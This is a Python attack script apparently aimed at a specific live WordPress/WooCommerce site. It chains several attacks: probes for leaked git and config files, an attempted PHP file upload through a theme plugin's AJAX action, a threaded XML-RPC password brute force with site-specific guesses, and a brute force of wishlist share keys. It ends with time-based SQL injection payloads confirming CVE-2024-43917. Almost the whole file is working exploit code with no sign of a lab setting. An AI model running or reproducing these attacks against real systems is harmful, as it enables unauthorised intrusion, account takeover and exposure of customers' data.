#!/usr/bin/env python3
"""Lean Critical smash for kznvip - fast vectors first, small sharekey sample."""
from __future__ import annotations

import hashlib
import json
import random
import statistics
import time
import urllib.error
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timedelta, timezone
from pathlib import Path

TARGET = "https://kznvip.co.za"
OUT = Path("artifacts")
OUT.mkdir(exist_ok=True)
Path("out").mkdir(exist_ok=True)

KNOWN_EMPTY = {"a4bc53", "bfa79e", "c631be", "e6b382", "534e24", "50bc47", "a6cf09"}
DAYS = ["Mon", "Tue", "Wed", "Thu", "Fri", "Sat", "Sun"]
MONTHS = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"]

results = {"ts": time.time(), "vectors": {}, "confirmed": [], "leads": []}


def date_r(dt: datetime) -> str:
    off = dt.strftime("%z")
    return (
        f"{DAYS[dt.weekday()]}, {dt.day:02d} {MONTHS[dt.month - 1]} {dt.year} "
        f"{dt.hour:02d}:{dt.minute:02d}:{dt.second:02d} {off}"
    )


def http(method, url, data=None, headers=None, timeout=25):
    h = {"User-Agent": "Mozilla/5.0 lurksek-critical-lean", "Accept": "*/*"}
    if headers:
        h.update(headers)
    req = urllib.request.Request(url, data=data, headers=h, method=method)
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, time.time() - t0, r.read(), dict(r.headers)
    except urllib.error.HTTPError as e:
        body = e.read() if hasattr(e, "read") else str(e).encode()
        return e.code, time.time() - t0, body, dict(getattr(e, "headers", {}) or {})
    except Exception as e:
        return 0, time.time() - t0, str(e).encode(), {}


def note(vec, entry):
    results["vectors"].setdefault(vec, []).append(entry)
    print(f"[{vec}] {entry}", flush=True)


def smash_hosting():
    print("=== HOSTING ===", flush=True)
    for path in [
        "/.git/HEAD",
        "/.git/config",
        "/wp-config.php.bak",
        "/wp-config.php.old",
        "/wp-config.txt",
        "/phpinfo.php",
        "/server-status",
        "/wp-content/debug.log",
        "/wp-content/uploads/",
        "/wp-content/uploads/revslider/",
        "/wp-json/trx_addons/v1/",
        "/readme.html",
    ]:
        code, t, body, _ = http("GET", TARGET + path, timeout=15)
        text = body[:150].decode("utf-8", "replace")
        note("hosting", {"path": path, "code": code, "body": text})
        if code == 200 and any(k in text for k in ["ref:", "[core]", "DB_PASSWORD", "kznemvifiv", "Index of"]):
            results["leads"].append({"vector": "hosting", "path": path, "body": text})
            if "DB_PASSWORD" in text or "[core]" in text:
                results["confirmed"].append({"type": "source_or_git_leak", "path": path, "body": text[:500]})


def smash_wc_jetpack():
    print("=== WC/JETPACK ===", flush=True)
    for path in [
        "/wp-json/wc/v3/orders",
        "/wp-json/wc/v3/customers",
        "/wp-json/wc/v3/system_status",
        "/wp-json/wc/private/settings",
        "/wp-json/wc/store/cart",
        "/wp-json/wc-admin/options",
        "/wp-json/jetpack/v4/connection",
        "/wp-json/jetpack/v4/site",
        "/wp-json/contact-form-7/v1/contact-forms",
        "/wp-json/wp/v2/users/1?context=edit",
        "/wp-json/wp/v2/settings",
    ]:
        code, t, body, _ = http("GET", TARGET + path, timeout=15)
        text = body[:180].decode("utf-8", "replace")
        note("wc_jp", {"path": path, "code": code, "body": text})
        if code == 200 and any(k in text.lower() for k in ["email", "billing", "total_sales", "consumer_key", "database"]):
            results["leads"].append({"vector": "wc_jp", "path": path, "body": text})


def smash_mwai():
    print("=== MWAI ===", flush=True)
    tests = [
        ("GET", "/wp-json/mwai/v1/models", None, None),
        ("GET", "/wp-json/mwai-ui/v1/models", None, None),
        ("GET", "/wp-json/mwai/v1/files", None, None),
        (
            "POST",
            "/wp-json/mwai/v1/simpleChatbotQuery",
            json.dumps({"message": "ping", "botId": "default"}).encode(),
            {"Content-Type": "application/json"},
        ),
        (
            "POST",
            "/wp-json/mwai/v1/ai/completions",
            json.dumps({"message": "ping"}).encode(),
            {"Content-Type": "application/json"},
        ),
        # AI Engine file upload endpoint variants
        (
            "POST",
            "/wp-json/mwai/v1/files",
            b"--x\r\nContent-Disposition: form-data; name=\"file\"; filename=\"t.txt\"\r\n\r\nhi\r\n--x--\r\n",
            {"Content-Type": "multipart/form-data; boundary=x"},
        ),
    ]
    for method, path, data, headers in tests:
        code, t, body, _ = http(method, TARGET + path, data=data, headers=headers or {}, timeout=20)
        text = body[:200].decode("utf-8", "replace")
        note("mwai", {"path": path, "code": code, "body": text})
        if code == 200 and any(k in text.lower() for k in ["openai", "gpt", "answer", "success", "models", "url"]):
            results["leads"].append({"vector": "mwai", "path": path, "code": code, "body": text})


def smash_uploads():
    print("=== UPLOADS ===", flush=True)
    boundary = "----Crit" + hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
    parts = []
    for k, v in [
        ("action", "trx_addons_uploads_save_data"),
        ("nonce", "08bbf42fbe"),
        ("name", "crit.php"),
        ("data", "<?php echo 'CRIT'; ?>"),
    ]:
        parts.append(f"--{boundary}\r\nContent-Disposition: form-data; name=\"{k}\"\r\n\r\n{v}\r\n".encode())
    parts.append(f"--{boundary}--\r\n".encode())
    code, t, body, _ = http(
        "POST",
        TARGET + "/wp-admin/admin-ajax.php",
        data=b"".join(parts),
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
        timeout=20,
    )
    note("trx_upload", {"code": code, "body": body[:120].decode("utf-8", "replace")})

    for action in ["revslider_ajax_action", "revslider_ajax_call_front"]:
        data = urllib.parse.urlencode({"action": action, "client_action": "get_slider_html"}).encode()
        code, t, body, _ = http(
            "POST",
            TARGET + "/wp-admin/admin-ajax.php",
            data=data,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            timeout=15,
        )
        note("revslider", {"action": action, "code": code, "body": body[:120].decode("utf-8", "replace")})

    for path in [
        "/wp-json/elementor/v1/globals",
        "/wp-json/elementor/v1/site-editor/templates",
    ]:
        code, t, body, _ = http("GET", TARGET + path, timeout=15)
        note("elementor", {"path": path, "code": code, "body": body[:120].decode("utf-8", "replace")})


def smash_xmlrpc():
    print("=== XMLRPC parallel ===", flush=True)
    users = ["Kznbk90iub0e", "admin", "kznemvifiv", "kznvip", "root"]
    passwords = [
        "Kznbk90iub0e",
        "kznvip",
        "kznvip123",
        "Password1!",
        "admin",
        "admin123",
        "Afrihost1!",
        "kznemvifiv",
        "Welcome1",
        "P@ssw0rd",
    ]
    pairs = [(u, p) for u in users for p in passwords]

    def try_pair(up):
        u, p = up
        xml = (
            '<?xml version="1.0"?>'
            "<methodCall><methodName>wp.getUsersBlogs</methodName>"
            f"<params><param><value><string>{u}</string></value></param>"
            f"<param><value><string>{p}</string></value></param></params></methodCall>"
        )
        code, t, body, _ = http(
            "POST",
            TARGET + "/xmlrpc.php",
            data=xml.encode(),
            headers={"Content-Type": "text/xml"},
            timeout=12,
        )
        text = body.decode("utf-8", "replace")
        hit = ("isAdmin" in text or "blogid" in text.lower()) and "fault" not in text.lower()
        return {"user": u, "pass": p, "code": code, "hit": hit, "body": text[:120]}

    with ThreadPoolExecutor(max_workers=10) as ex:
        for r in ex.map(try_pair, pairs):
            note("xmlrpc", r)
            if r["hit"]:
                results["confirmed"].append({"type": "xmlrpc_weak_creds", **r})
                print("CRITICAL_XMLRPC_CREDS", r["user"], r["pass"], flush=True)


def smash_sharekeys_small():
    print("=== SHAREKEY small (4k) ===", flush=True)
    keys = set()
    # denser recent window only
    for year in (2024, 2025, 2026):
        d = datetime(year, 1, 1, tzinfo=timezone(timedelta(hours=2)))
        end = (
            datetime(2026, 8, 27, tzinfo=timezone(timedelta(hours=2)))
            if year == 2026
            else datetime(year, 12, 31, tzinfo=timezone(timedelta(hours=2)))
        )
        while d <= end and len(keys) < 3500:
            for hour in (12, 16, 18):
                for tz_h in (2, 0):
                    dt = datetime(d.year, d.month, d.day, hour, 0, 0, tzinfo=timezone(timedelta(hours=tz_h)))
                    dr = date_r(dt)
                    for rnum in range(0, 3001, 17):
                        keys.add(hashlib.md5((dr + str(rnum)).encode()).hexdigest()[:6])
            d += timedelta(days=3)
    for _ in range(1500):
        keys.add(format(random.randint(0, 0xFFFFFF), "06x"))
    keys -= KNOWN_EMPTY
    probe = list(keys)
    random.shuffle(probe)
    probe = probe[:4000]
    found = []

    def probe_one(sk):
        code, t, body, _ = http("GET", f"{TARGET}/wp-json/wc/v3/wishlist/get_by_share_key/{sk}", timeout=10)
        if code != 200:
            return None
        try:
            j = json.loads(body.decode("utf-8", "replace"))
        except Exception:
            return None
        return j if isinstance(j, dict) and j.get("share_key") else None

    checked = 0
    with ThreadPoolExecutor(max_workers=40) as ex:
        futs = {ex.submit(probe_one, sk): sk for sk in probe}
        for fut in as_completed(futs):
            checked += 1
            if checked % 1000 == 0:
                print(f"share progress {checked}/{len(probe)} found={len(found)}", flush=True)
            try:
                j = fut.result()
            except Exception:
                continue
            if j:
                found.append(j)
                print("FOUND_WL", j, flush=True)

    populated = []
    for j in found:
        sk = j["share_key"]
        code, t, body, _ = http("GET", f"{TARGET}/wp-json/wc/v3/wishlist/{sk}/get_products?count=100", timeout=20)
        try:
            arr = json.loads(body.decode("utf-8", "replace"))
            n = len(arr) if isinstance(arr, list) else -1
        except Exception:
            n = -1
            arr = None
        print(f"PRODUCTS {sk} n={n}", flush=True)
        if n and n > 0:
            populated.append({"share": sk, "n": n, "meta": j})
            # SQLi confirm
            suite = []
            for lab, order in [
                ("ASC1", "ASC"),
                ("ASC2", "ASC"),
                ("S5a", ",(SELECT SLEEP(5))--"),
                ("S5b", ",(SELECT SLEEP(5))--"),
                ("S10a", ",(SELECT SLEEP(10))--"),
                ("S10b", ",(SELECT SLEEP(10))--"),
                ("ASC3", "ASC"),
            ]:
                q = urllib.parse.urlencode({"_method": "GET", "order": order})
                data = f"rest_route=/wc/v3/wishlist/{sk}/get_products".encode()
                code, t, body, _ = http(
                    "POST",
                    f"{TARGET}/?{q}",
                    data=data,
                    headers={"Content-Type": "application/x-www-form-urlencoded"},
                    timeout=90,
                )
                suite.append({"label": lab, "code": code, "time": round(t, 3)})
                print(f"SQLI {lab} {code} {t:.2f}", flush=True)
            asc = [x["time"] for x in suite if x["label"].startswith("ASC") and x["code"] == 200]
            s5 = [x["time"] for x in suite if x["label"].startswith("S5") and x["code"] == 200]
            s10 = [x["time"] for x in suite if x["label"].startswith("S10") and x["code"] == 200]
            if asc and s5 and s10:
                a = statistics.median(asc)
                if all(t >= a + 3.5 for t in s5) and all(t >= a + 8 for t in s10):
                    results["confirmed"].append({"type": "CVE-2024-43917", "share": sk, "asc": asc, "s5": s5, "s10": s10})
                    print("CRITICAL_SQLI_CONFIRMED", flush=True)

    results["vectors"]["sharekey"] = {"probe_n": len(probe), "found": found, "populated": populated}
    print("sharekey done found=", len(found), "populated=", len(populated), flush=True)


def main():
    smash_hosting()
    smash_wc_jetpack()
    smash_mwai()
    smash_uploads()
    smash_xmlrpc()
    smash_sharekeys_small()
    results["confirmed_count"] = len(results["confirmed"])
    results["leads_count"] = len(results["leads"])
    for p in (OUT / "critical_results.json", Path("out/critical_results.json")):
        p.write_text(json.dumps(results, indent=2, default=str))
    print("DONE confirmed=", results["confirmed_count"], "leads=", results["leads_count"], flush=True)
    if results["confirmed"]:
        print("CRITICAL_CONFIRMED", json.dumps(results["confirmed"])[:1500], flush=True)


if __name__ == "__main__":
    main()
